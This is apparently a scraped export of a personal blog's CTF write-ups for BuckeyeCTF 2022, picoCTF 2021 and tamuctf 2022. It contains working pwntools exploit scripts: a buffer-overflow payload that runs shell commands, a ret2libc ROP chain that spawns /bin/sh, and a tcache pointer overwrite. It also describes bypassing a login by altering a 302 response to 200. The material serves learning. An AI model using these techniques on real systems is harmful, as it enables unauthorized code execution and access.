search().\nAnd, in search(), it basically prints out a character that is pointed by that memory address. This is how we are able to see the leaked address in GDB and use that (by examining things around the leaked address) to find the buffer in the main function and the offset to the shellcode.\nOf course, the attack should happen in encounter() because the buffer in that function also can be controlled by us and we can replace the return address with the offset we calculate. The reference describes how to do all this in detail.\nThings I Learned Using a negative index value to expose stack address.\nGood understanding of a target application is important.\nBecame more familiar with pwntools\u0026rsquo; shellcode generation.\n","permalink":"https://joonkim0625.github.io/posts/2022-11-30-ronin/","summary":"\u003ch2 id=\"references\"\u003eReferences\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://git.mbund.org/mbund/buckeyectf-2022/src/branch/main/writeups/ronin/ronin.md\"\u003ehttps://git.mbund.org/mbund/buckeyectf-2022/src/branch/main/writeups/ronin/ronin.md\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"decompiled-code\"\u003eDecompiled code\u003c/h2\u003e\n\u003cp\u003eAfter decompiling the binary, I was able to take a look at those major funtions\nthat make up this program.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003emain()\u003c/code\u003e:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char shellcode_buffer[80]; // [rsp+0h] [rbp-50h] BYREF\n\n  setvbuf(_bss_start, 0LL, 2, 0LL);\n  scroll(txt);\n  fgets(shellcode_buffer, 80, stdin);\n  if ( !strncmp(\u0026#34;Chase after it.\u0026#34;, shellcode_buffer, 15uLL) )\n  {\n    scroll(off_4028);\n    chase();\n  }\n  scroll(off_4030);\n  return 0;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003escroll()\u003c/code\u003e:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eize_t __fastcall scroll(const char *addr_to_some_buffer)\n{\n  __useconds_t v1; // eax\n  size_t result; // rax\n  char single_char; // [rsp+1Fh] [rbp-11h]\n  size_t v4; // [rsp+20h] [rbp-10h]\n  size_t i; // [rsp+28h] [rbp-8h]\n\n  v4 = strlen(addr_to_some_buffer);\n  for ( i = 0LL; ; ++i )\n  {\n    result = i;\n    if ( i \u0026gt;= v4 )\n      break;\n    single_char = addr_to_some_buffer[i];       // printing a single char from the string array\n    putchar(single_char);\n    if ( single_char == 10 )\n      v1 = 1000000;\n    else\n      v1 = 50000;\n    usleep(v1);\n  }\n  return result;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003eencounter()\u003c/code\u003e:\u003c/p\u003e","title":"BuckeyeCTF 2022 - pwn: ronin"},{"content":"BuckeyeCTF 2022 - pwn: samurai What I didn\u0026rsquo;t understand was the program inserts ./n which can be represented as 0x2ea. This is just a part of the string that it gets printed out to STDOUT. How this program works is it reads in some input from STDIN using fgets. fgets inserts a newline char after reading everything in (EOF or newline). But, if the input that I pass in to overflow the buffer that does not end with a newline char, then it will keep going (or being read) until it overflows the variable I want to overwrite. It can still work but there is this line of code strcpy(\u0026amp;s[strlen(s) - 1], \u0026quot;.\\n\u0026quot;); that puts a new line character at strlen(s) - 1. So, when I was naively giving an input that I would think should overwrite the variable, the last bit was always replaced by 2ea which is .\\n. AH!!!!!!!!!!!! So, what we would want to do is at least have a newline char in the middle of the string so strcpy does not insert that .\\n where the last bit is (this bit is still needed to be overwritten with some value to make the attack happen).\nDisassembly I used IDA community edition to disassemble the binary to see what needs to be done to get the flag.\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp) { char s[32]; // [rsp+0h] [rbp-30h] BYREF char *command; // [rsp+20h] [rbp-10h] int win_var; // [rsp+2Ch] [rbp-4h] setvbuf(_bss_start, 0LL, 2, 0LL); strcpy(s, \u0026#34;RIGHT, right. \u0026#34;); win_var = 1768515945; scroll(txt); fgets(\u0026amp;s[14], 48, stdin); strcpy(\u0026amp;s[strlen(s) - 1], \u0026#34;.\\n\u0026#34;); scroll(s); scroll(off_4088); if ( win_var == 0x4774CC ) { command = (char *)malloc(8uLL); scroll(off_4098); fgets(command, 8, stdin); system(command); } else { scroll(off_4090); } exit(0); } It looks likes we need to control the win_var variable to enter the if statement. After playing with the GDB, overflowing the buffer s allows me to overflow the integer variable as well. Some of the small things that I missed during the exploitation is already mentioned above.\nExploit maybe write an example how my payload can be messed up import pwn r = pwn.remote(\u0026#39;pwn.chall.pwnoh.io\u0026#39;, 13371) #r = pwn.gdb.debug(\u0026#39;./samurai\u0026#39;) # As I mentioned above, inserting a null termination before it overflows the # buffer prevents a newline char being inserted! # The newline char after the hex value is to interact (or skip the prompt) with # the prompt that asks for a command to enter # I decided to cat everything within the directory and then searched the flag payload = b\u0026#39;A\u0026#39; * 12 + b\u0026#39;\\x00\u0026#39; + b\u0026#39;A\u0026#39; * 17 + pwn.p32(0x4774CC) + b\u0026#39;\\ncat *\u0026#39; r.sendline(payload) r.interactive() Debug mode with gdb buckeye{7h3_1393nd_0f_7h3_s4mur41_b391n5}\nLessons learned Make sure that I understand what is going on with the disassembled version of the binary (or at least try to understand as much as I can) so I don\u0026rsquo;t spend too much time on dealing with things like figuring out why a newline char keeps being added.\n","permalink":"https://joonkim0625.github.io/posts/2022-11-29-samurai/","summary":"\u003ch2 id=\"buckeyectf-2022---pwn-samurai\"\u003eBuckeyeCTF 2022 - pwn: samurai\u003c/h2\u003e\n\u003cp\u003eWhat I didn\u0026rsquo;t understand was the program inserts \u003ccode\u003e./n\u003c/code\u003e which can be represented\nas \u003ccode\u003e0x2ea\u003c/code\u003e. This is just a part of the string that it gets printed out to STDOUT. How\nthis program works is it reads in some input from STDIN using \u003ccode\u003efgets\u003c/code\u003e. \u003ccode\u003efgets\u003c/code\u003e\ninserts a newline char after reading everything in (EOF or newline). But, if the\ninput that I pass in to overflow the buffer that does not end with a newline char,\nthen it will keep going (or being read) until it overflows the variable I want to overwrite.\nIt can still work but there is this line of code \u003ccode\u003estrcpy(\u0026amp;s[strlen(s) - 1], \u0026quot;.\\n\u0026quot;);\u003c/code\u003e\nthat puts a new line character at strlen(s) - 1. So, when I was naively giving\nan input that I would think should overwrite the variable, the last bit was\nalways replaced by \u003ccode\u003e2ea\u003c/code\u003e which is \u003ccode\u003e.\\n\u003c/code\u003e. AH!!!!!!!!!!!! So, what we would want\nto do is at least have a newline char in the middle of the string so strcpy does\nnot insert that \u003ccode\u003e.\\n\u003c/code\u003e where the last bit is (this bit is still needed to be\noverwritten with some value to make the attack happen).\u003c/p\u003e","title":"BuckeyeCTF 2022 - pwn: samurai"},{"content":"IA32 Assembly Language As I was working on picoCTF2021 - filtered-shellcode challenge, I realized that I need to write the shellcode in 32 bit assembly rather than in 64 bit. And compiling 32 bit assembly code is different than compiling 64 bit assembly code using gcc.\nGreat reference: https://academic.macewan.ca/boersn/images/quickref-20121215.pdf\nFirst, to create an object file, use nasm.\nnasm -f elf32 -o file.o file.s. This creates an object file file.o\nThen link the object file with ld. The object file must have global _start.\nld -m elf_i386 -e _start -o file file.o\nThis will create a binary file. We can get the assembly code back by running this command objdump -M intel-mnemonic -D ./file\nThe assembly code would start as below:\nglobal _start section .text _start: xor eax, eax ... You can look at how many bytes each instruction takes up by using objdump, but if you want to get the string literal and use that to pass in as data stream, you can go here: https://defuse.ca/online-x86-assembler.htm#disassembly and enter your shellcode.\n","permalink":"https://joonkim0625.github.io/posts/2022-5-27-ia32-assembly/","summary":"\u003ch2 id=\"ia32-assembly-language\"\u003eIA32 Assembly Language\u003c/h2\u003e\n\u003cp\u003eAs I was working on picoCTF2021 - filtered-shellcode challenge, I realized that\nI need to write the shellcode in 32 bit assembly rather than in 64 bit. And\ncompiling 32 bit assembly code is different than compiling 64 bit assembly code\nusing \u003ccode\u003egcc\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eGreat reference: \u003ca href=\"https://academic.macewan.ca/boersn/images/quickref-20121215.pdf\"\u003ehttps://academic.macewan.ca/boersn/images/quickref-20121215.pdf\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eFirst, to create an object file, use \u003ccode\u003enasm\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003enasm -f elf32 -o file.o file.s\u003c/code\u003e. This creates an object file \u003ccode\u003efile.o\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eThen link the object file with \u003ccode\u003eld\u003c/code\u003e. The object file must have \u003ccode\u003eglobal _start\u003c/code\u003e.\u003c/p\u003e","title":"IA-32 Assembly"},{"content":"Description AUTHOR: MADSTACKS\nDescription: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774\nHints: PWNTools has a lot of useful features for getting offsets.\nReferences https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/\nhttps://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc\nhttps://ctf101.org/binary-exploitation/relocation-read-only/\nhttps://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc\nMy Approach In challenges like this one, you are given an executable, a libc library, and a Makefile to work with. And the first thing I do is to find some information about the executable file.\n$ file vuln vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5dba3e6ed29e457cd104accb279e127285eecd0, not stripped $ checksec --file=vuln 130 ⨯ RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Partial RELRO No canary found NX enabled No PIE No RPATH RW-RUNPATH 68) Symbols No 0 0 vuln By running file and checksec on the given file, we can see that the file is stripped, dynamically linked 64-bit binary with some protections enabled. Let\u0026rsquo;s take a quick look at what the protections do.\nRELRO: This is about Global Offset Table (GOT) and when it is set to \u0026ldquo;Full RELRO\u0026rdquo;, we won\u0026rsquo;t be able to overwrite a function pointer or hijack the control flow of the program. When it is set to \u0026ldquo;Partial RELRO\u0026rdquo;, which is the default setting in GCC, it will force the GOT to come before the BSS (block starting symbol) in memory so that it prevents the risk of a buffer overflows on a global variable overwriting GOT entries.\nCanary found: This means that there is a stack canary which prevents buffer overflows. It can still be exploited by bypassing the canary.\nNX (No eXecute) enabled: This means that there is NO memory region that is both writable and executable. So this can tell us that injecting shellcode might not be the option for this particular program.\nPIE enabled: PIE (Position Independent Executable) allows the program to be executed with randomized base address. So, if it is enabled, it prevents attacks such as ROP or ret2libc since attackers won\u0026rsquo;t be able to know any addresses unless there are some kinds of address leaks.\nAnd the next thing we can do is to get the source code by using Ghidra. Then we can get these three functions:\n// main void main(undefined4 param_1,undefined8 param_2) { char converted_str; char acStack168 [24]; undefined8 uStack144; undefined8 local_88; undefined4 local_7c; undefined8 local_78; undefined8 local_70; undefined8 local_68; undefined2 local_60; undefined local_5e; char *welcome_string; undefined8 local_48; ulong local_40; __gid_t local_34; ulong local_30; uStack144 = 0x40079c; local_88 = param_2; local_7c = param_1; setbuf(stdout,(char *)0x0); uStack144 = 0x4007a1; local_34 = getegid(); uStack144 = 0x4007bb; setresgid(local_34,local_34,local_34); local_40 = 0x1b; local_78 = 0x20656d6f636c6557; local_70 = 0x636520796d206f74; local_68 = 0x6576726573206f68; local_60 = 0x2172; local_5e = 0; local_48 = 0x1a; welcome_string = acStack168; for (local_30 = 0; local_30 \u0026lt; local_40; local_30 = local_30 + 1) { converted_str = convert_case((int)*(char *)((long)\u0026amp;local_78 + local_30),local_30); welcome_string[local_30] = converted_str; } puts(welcome_string); do { do_stuff(); } while( true ); } // do_stuff void do_stuff(void) { char cVar1; undefined local_89; char input_buf [112]; undefined8 local_18; ulong local_10; local_18 = 0; __isoc99_scanf(\u0026#34;%[^\\n]\u0026#34;,input_buf); __isoc99_scanf(\u0026amp;DAT_0040093a,\u0026amp;local_89); for (local_10 = 0; local_10 \u0026lt; 100; local_10 = local_10 + 1) { cVar1 = convert_case((int)input_buf[local_10],local_10); input_buf[local_10] = cVar1; } puts(input_buf); return; } Gathering Information Looking at the main function, within the while loop, we can see that do_stuff() does the most work here. So taking a look at do_stuff(), we can see that it accepts user input until it sees a new line to local_88[112]. I feel like we can do something by overflowing the buffer! However, remember, this file has NX enabled so we just can\u0026rsquo;t overwrite the address to return to the stack (so we should have the return address point to something that is already in libc!).\nFirst, let\u0026rsquo;s just try to pass in some arbitrary stuff to see if we can crash the program first.\nRunning the program under gef, I created a cyclic with the size of 256 bytes and n=8. Then it gives you something like this \u0026lsquo;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\u0026rsquo;. Once you provide this as the input to the prompt you see when the program gets executed, we can see that $rsp gets overwritten by the input.\n0x007fffffffde58│+0x0000: \u0026#34;jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]\u0026#34; ← $rsp As we can see, $rsp starts with \u0026lsquo;jaab\u0026hellip;\u0026rsquo; and if you move onto the next assembly instruction, the program crashes. So I think that if we\nUse metasploit framework\u0026rsquo;s pattern_create and pattern_offset, I was able to get the offset 136 which means the gap between the buffer and the return address is 136 bytes big. So our strategy should be to fill 136 bytes with a bunch of As and fil the return address with whatever instructions that we want the program to execute instead.\nNext thing we need to do is to find things that we can use to achieve our goal. This means that we would need to find memory addresses to functions that we need in order to lunch a shell on this remote server.\nASLR ASLR is a mitigation technique that is used to prevent memory exploitation by randomizing memory addresses of stack, heap, and libraries each time a process runs. Because of this, we can know that the functions that we should look from libc will always move aroud in terms of the memory addresses to them. What we should do in this case is to use one of the built-in functions that is used in the program to find out the offset to libc library that is loaded into the program at the moment. Once we get a memory address, we are going to use that to calcuate offsets to the functions that we need .\nFrom the source code above, we can see that puts() is used in do_stuff() after accepting a user input and modifying the input. So it is a hint that we can use puts() to calculate the offset to the libc library.\nPLT \u0026amp; GOT Reference: https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got\nPLT: Procedure Linkage Table which is used to call external procedures/functions whose address isn\u0026rsquo;t known in the time of linking and is left to be resolved by the dynamic linker at run time\nPLT is a readable section of memory that jumps to the GOT to call a function. GOT by extension is a writable section of memory that looks up the function pointers through the dynamic linker the first time it is called.\nSolution pwntools provides many great features and we can utilize one of the features to get the plt/got address to puts and main functions.\nfrom pwn import * vuln = ELF(\u0026#34;./vuln_patched\u0026#34;) context.binary = \u0026#39;./vuln_patched\u0026#39; libc = ELF(\u0026#34;./libc.so.6\u0026#34;) # r = vuln.process() r = remote(\u0026#34;mercury.picoctf.net\u0026#34;, 1774) # get the address to the puts function in PLT puts_plt = vuln.plt[\u0026#39;puts\u0026#39;] # get the addres to the main function in PLT main_plt = vuln.symbols[\u0026#39;main\u0026#39;] # As the GOT is part of the binary, it will always be a constant offset away from the base puts_got = vuln.got[\u0026#39;puts\u0026#39;] # this is the gadget \u0026#39;pop rdi, ret\u0026#39; # why this? here is a great article that explains this well # https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/gadgets gadget = 0x400913 payload = b\u0026#34;A\u0026#34; * 136 payload += p64(gadget) payload += p64(puts_got) payload += p64(puts_plt) payload += p64(main_plt) print(payload) print(r.recvline()) r.sendline(payload) #r.interactive() # second rop print(r.recvline()) received_line = r.recvline().strip() print(received_line) leak = u64(received_line.ljust(8, b\u0026#34;\\x00\u0026#34;)) print(hex(leak)) # Once we get the pointers to to puts\u0026#39; plt/got and main\u0026#39;s address (the purpose of the first payload), # we can get libc address using libc.sysmbols[\u0026#39;puts\u0026#39;] libc.address = leak - libc.symbols[\u0026#39;puts\u0026#39;] # now we have the base libc addr binsh = next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # the actual string is the next one from the memory address that is being pointed to system = libc.symbols[\u0026#39;system\u0026#39;] payload2 = b\u0026#34;A\u0026#34; * 136 payload2 += p64(0x000000000040052e) # ret instruction (gadget) to algin the stack payload2 += p64(gadget) # pop rdi, ret payload2 += p64(binsh) # this will be put into rdi payload2 += p64(system) # call system with /bin/sh as its first arg r.clean() r.sendline(payload2) r.interactive() This was a very interesting challenge that taught me a lot of things. Please let me know if I missed something or if my understanding is not correct by sending me an email. Thanks for reading!\n","permalink":"https://joonkim0625.github.io/posts/2022-5-24-heresalibc/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eAUTHOR: MADSTACKS\u003c/p\u003e\n\u003cp\u003eDescription: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774\u003c/p\u003e\n\u003cp\u003eHints: PWNTools has a lot of useful features for getting offsets.\u003c/p\u003e\n\u003ch2 id=\"references\"\u003eReferences\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/\"\u003ehttps://faraz.faith/2019-10-12-picoctf-2019-heap-challs/\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc\"\u003ehttps://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://ctf101.org/binary-exploitation/relocation-read-only/\"\u003ehttps://ctf101.org/binary-exploitation/relocation-read-only/\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc\"\u003ehttps://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"my-approach\"\u003eMy Approach\u003c/h2\u003e\n\u003cp\u003eIn challenges like this one, you are given an executable, a libc library, and a\nMakefile to work with. And the first thing I do is to find some information\nabout the executable file.\u003c/p\u003e","title":"picoCTF 2021 - Here's a LIBC"},{"content":"Description While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. nc mercury.picoctf.net 31153 heapedit Makefile libc.so.6\nHints: It may be helpful to read a little bit on GLIBC\u0026rsquo;s tcache.\nMy Approach Until this point, I had not done any binary exploits that are related to the heap. And this challenge gave me a better understanding of heap allocation/deallocation and how one can try to exploit the glibc heap.\nThis article was very helpful in understanding how free() works. It is very fascinating there are many different algorithms to optimize the process of freeing memory space from the heap.\nThe source code was not given so I used Ghidra to get the source code.\n// Source code for the executable \u0026#39;heapedit\u0026#39; long in_FS_OFFSET; undefined val_input; int addr_input; int local_a4; undefined8 *local_a0; undefined8 *first_buf; FILE *flag_fd; undefined8 *second_buf; void *local_80; // this is the buffer that has the mem address to the first malloc\u0026#39;d buffer undefined8 rand_string; undefined8 rand_string_1; undefined8 rand_string_2; undefined rand_string_nullbyte; char flag_buf [72]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); setbuf(stdout,(char *)0x0); flag_fd = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); fgets(flag_buf,0x40,flag_fd); rand_string = 0x2073692073696874; rand_string_1 = 0x6d6f646e61722061; rand_string_2 = 0x2e676e6972747320; rand_string_nullbyte = 0; local_a0 = (undefined8 *)0x0; for (local_a4 = 0; local_a4 \u0026lt; 7; local_a4 = local_a4 + 1) { first_buf = (undefined8 *)malloc(0x80); if (local_a0 == (undefined8 *)0x0) { local_a0 = first_buf; } *first_buf = 0x73746172676e6f43; first_buf[1] = 0x662072756f592021; first_buf[2] = 0x203a73692067616c; *(undefined *)(first_buf + 3) = 0; strcat((char *)first_buf,flag_buf); } second_buf = (undefined8 *)malloc(0x80); *second_buf = 0x5420217972726f53; second_buf[1] = 0x276e6f7720736968; second_buf[2] = 0x7920706c65682074; *(undefined4 *)(second_buf + 3) = 0x203a756f; *(undefined *)((long)second_buf + 0x1c) = 0; strcat((char *)second_buf,(char *)\u0026amp;rand_string); free(first_buf); // 0x603800 free(second_buf); // 0x603890 addr_input = 0; val_input = 0; puts(\u0026#34;You may edit one byte in the program.\u0026#34;); printf(\u0026#34;Address: \u0026#34;); __isoc99_scanf(\u0026amp;DAT_00400b48,\u0026amp;addr_input); printf(\u0026#34;Value: \u0026#34;); __isoc99_scanf(\u0026amp;DAT_00400b53,\u0026amp;val_input); *(undefined *)((long)addr_input + (long)local_a0) = val_input; // local_a0 = 0x6034a0 local_80 = malloc(0x80); puts((char *)((long)local_80 + 0x10)); // reason for +0x10 is to skip the metadata about the chunk if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; When passing in 0, 0 (address, value) as the input to the program, I got this \u0026rsquo;t help you: this is a random string.'\nYou may edit one byte in the program. Address: 0 Value: 0 t help you: this is a random string. After looking at the code, I found out that the part of the string was actually from a memory space that was freed (started at 0x603890 and the actual string was from 0x6038a0). And when this line of code \u0026rsquo;local_80 = malloc(0x80);\u0026rsquo; executed, the memory address that was freed \u0026lsquo;free(second_buf)\u0026rsquo; was reused! When free is used, due to some optimization choices that the heap manger can use, if malloc() asks for the same size space that can be found in tcache bin it will return the memory address that is at the top of the linked list (the head of the linked list - so think of this structure as LIFO).\nAnd I realized that (after a long time) we could controll/manipulate what malloc() will return by giving the right inputs to the program.\nAnd that is possible because, from this line of code \u0026lsquo;*(undefined *)((long)addr_input + (long)local_a0) = val_input;\u0026rsquo;, we can see that it tries to add the input address we pass in to local_a0. And local_a0 has the memory address to the first buffer of 0x6034a0 \u0026lsquo;Congrats! Your flag is: \u0026hellip;\u0026rsquo;.\nKnowing how tcache works, I checked the tcache bins once those two free functions were called and I could see this:\nTcachebins[idx=7, size=0x90] count=2 ← Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE) ← Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE) So,\nthe first free() frees 0x603800.\nthe second free() frees 0x603890 which is the address to the second_buf \u0026lsquo;Sorry! This won\u0026rsquo;t help you: this is a random string[ \u0026hellip; ].\nAnd the last malloc call will return 0x603890 if the size the heap manager is looking for matches.\nthe memory address that was freed later is at the top of the linked list (LIFO). And the memory address to the first buffer is at the end of the linked list.\nSince the very last malloc() will return the memory address that is the first chunk in the tcache bin, we want to modify the pointer value which points to (or have the memory address of) 0x603890. I had a hard time understanding this at first but this makes a total sense because it is obvious that the memory address of 0x603890 is also assigned to a pointer variable. So we need to find the memory address of this pointer variable (so it can look like *some_ptr = 0x603890) and change its value to 0x603800 (since this points to the flag string). And we would do that by passing appropriate values to overwrite the pointer and this will return the memory address of 0x603800 when the last malloc() gets called.\nUsing search-pattern 0x603890 (I am using gef by the way), I could find the memory address to the variable that holds the memory address of 0x603890. It is 0x602088 (so it would look like *(0x602088) = 0x603890).\nThis means 0x6034a0 + X = 0x602088 ---\u0026gt; X = 0x602088 - 0x6034a0 = -5144.\nIf you examine the address at 0x602088, you get:\n0x602088: 0x90 0x38 0x60 And this is exactly the memory address that was freed later (at the top of the tcache bin) and the memory address is stored in the little-endian format. If we change 0x90 to 0x00, we can have *(0x602088) point to 0x603800 which will point to the flag string!\nI wrote a simple script in python:\nimport pwn p = pwn.remote(\u0026#39;mercury.picoctf.net\u0026#39;, 31153) address_offset = b\u0026#39;-5144\u0026#39; byte_to_edit = b\u0026#39;\\x00\u0026#39; p.sendline(address_offset) p.sendline(byte_to_edit) p.interactive() And I got the flag:\n+] Opening connection to mercury.picoctf.net on port 31153: Done [*] Switching to interactive mode You may edit one byte in the program. Address: Value: lag is: picoCTF{f2d58262f377f31fddf8576b59226f2a} [*] Got EOF while reading in interactive Conclusion I have not entirely understood the whole dynamic of the heap allocation/deallocation but I now know that I can use the implementation of the glibc heap to find vulnerabilities. It is very cool to see how there is always a chance for an exploitation.\n","permalink":"https://joonkim0625.github.io/posts/2022-5-12-glibc-tcache/","summary":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\u003cp\u003eWhile being super relevant with my meme references, I wrote a program to see how\nmuch you understand heap allocations. \u003ccode\u003enc mercury.picoctf.net 31153 heapedit Makefile libc.so.6\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eHints: It may be helpful to read a little bit on GLIBC\u0026rsquo;s tcache.\u003c/p\u003e\n\u003ch2 id=\"my-approach\"\u003eMy Approach\u003c/h2\u003e\n\u003cp\u003eUntil this point, I had not done any binary exploits that are related to the\nheap. And this challenge gave me a better understanding of heap\nallocation/deallocation and how one can try to exploit the glibc heap.\u003c/p\u003e","title":"picoCTF 2021 - Cache Me Outside"},{"content":"taumf2022: lockout Author: SwitchBlade\nI seem to have locked myself out of my admin panel! Can you find a way back in for me?\nDo not connect with HTTPS, make sure to connect with HTTP\nLink: http://lockout.tamuctf.com\nSolve I couldn\u0026rsquo;t solve this one so I referred to this https://www.youtube.com/watch?v=f198HnqCwng\u0026amp;t=206s video.\nWhen you attempt to login to the blog, the page gets redirected back to the login page right away because of the 302 response.\nI learned that if we can pass a 200 response instead of 302, we will be able to pass to see admin.php.\nBurp Suite is the best tool for this task.\nMake sure that \u0026lsquo;Intercept responses based on the following rules\u0026rsquo; box checked to capture/modify the response.\nOnce you are on the login page, pass in any username/password to get the response from the site. Then you would see something like this from Burp Suite.\nNow, we can replace 302 with 200 and click \u0026lsquo;forward\u0026rsquo; to get to the admin page. Once you do that, you will see the admin page.\nLet\u0026rsquo;s click the \u0026lsquo;PrintFlag\u0026rsquo; button since that is what we are most interested in. If you forward the response that you get from the server, you will be able to see another response with the flag.\nThis challenge taught me two things:\nlook at the network responses and see if I can bypass it with manipulating http status codes If that seems to be the case, use Burp Suite to capture responses and manipulate them. ","permalink":"https://joonkim0625.github.io/posts/2022-4-22-tamuctf2022-lockout/","summary":"\u003ch1 id=\"taumf2022-lockout\"\u003etaumf2022: lockout\u003c/h1\u003e\n\u003cp\u003eAuthor: SwitchBlade\u003c/p\u003e\n\u003cp\u003eI seem to have locked myself out of my admin panel! Can you find a way back in for me?\u003c/p\u003e\n\u003cp\u003eDo not connect with HTTPS, make sure to connect with HTTP\u003c/p\u003e\n\u003cp\u003eLink: \u003ca href=\"http://lockout.tamuctf.com\"\u003ehttp://lockout.tamuctf.com\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"solve\"\u003eSolve\u003c/h2\u003e\n\u003cp\u003eI couldn\u0026rsquo;t solve this one so I referred to this \u003ca href=\"https://www.youtube.com/watch?v=f198HnqCwng\u0026amp;t=206s\"\u003ehttps://www.youtube.com/watch?v=f198HnqCwng\u0026amp;t=206s\u003c/a\u003e video.\u003c/p\u003e\n\u003cp\u003eWhen you attempt to login to the blog, the page gets redirected back to the login\npage right away because of the 302 response.\u003c/p\u003e","title":"tamuctf 2022 - Lockout"},{"content":"tamuctf 2022: Lucky Author: nhwn\nFeeling lucky? I have just the challenge for you :D\nReference I could not solve this on my own so I had to refer to this writeup:\nhttps://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf/lucky\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void welcome() { char buf[16]; printf(\u0026#34;Enter your name: \u0026#34;); fgets(buf, sizeof(buf), stdin); printf(\u0026#34;\\nWelcome, %s\\nIf you\u0026#39;re super lucky, you might get a flag! \u0026#34;, buf); } int seed() { char msg[] = \u0026#34;GLHF :D\u0026#34;; printf(\u0026#34;%s\\n\u0026#34;, msg); int lol; return lol; } void win() { char flag[64] = {0}; FILE* f = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); fread(flag, 1, sizeof(flag), f); printf(\u0026#34;Nice work! Here\u0026#39;s the flag: %s\\n\u0026#34;, flag); } int main() { setvbuf(stdout, NULL, _IONBF, 0); welcome(); srand(seed()); int key0 = rand() == 306291429; int key1 = rand() == 442612432; int key2 = rand() == 110107425; if (key0 \u0026amp;\u0026amp; key1 \u0026amp;\u0026amp; key2) { win(); } else { printf(\u0026#34;Looks like you weren\u0026#39;t lucky enough. Better luck next time!\\n\u0026#34;); } } In welcome() function, before fgets gets called, rbp-0x10 which is the address to buf is loaded into rax. I passed in aaaabaaacaaadaaaeaaafaaag, the buffer was filled with aaaabaaacaaadaa\\0.\nDump of assembler code for function welcome: 0x00005555555551a5 \u0026lt;+0\u0026gt;:\tpush rbp 0x00005555555551a6 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x00005555555551a9 \u0026lt;+4\u0026gt;:\tsub rsp,0x10 # grow stack by 16 bytes 0x00005555555551ad \u0026lt;+8\u0026gt;:\tlea rdi,[rip+0xe54] # 0x555555556008 0x00005555555551b4 \u0026lt;+15\u0026gt;:\tmov eax,0x0 0x00005555555551b9 \u0026lt;+20\u0026gt;:\tcall 0x555555555050 \u0026lt;printf@plt\u0026gt; 0x00005555555551be \u0026lt;+25\u0026gt;:\tmov rdx,QWORD PTR [rip+0x2ebb] # 0x555555558080 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x00005555555551c5 \u0026lt;+32\u0026gt;:\tlea rax,[rbp-0x10] 0x00005555555551c9 \u0026lt;+36\u0026gt;:\tmov esi,0x10 0x00005555555551ce \u0026lt;+41\u0026gt;:\tmov rdi,rax 0x00005555555551d1 \u0026lt;+44\u0026gt;:\tcall 0x555555555070 \u0026lt;fgets@plt\u0026gt; # rbp-0x10 which is 0x7fffffffe160 points to the start of the string input # from the command line 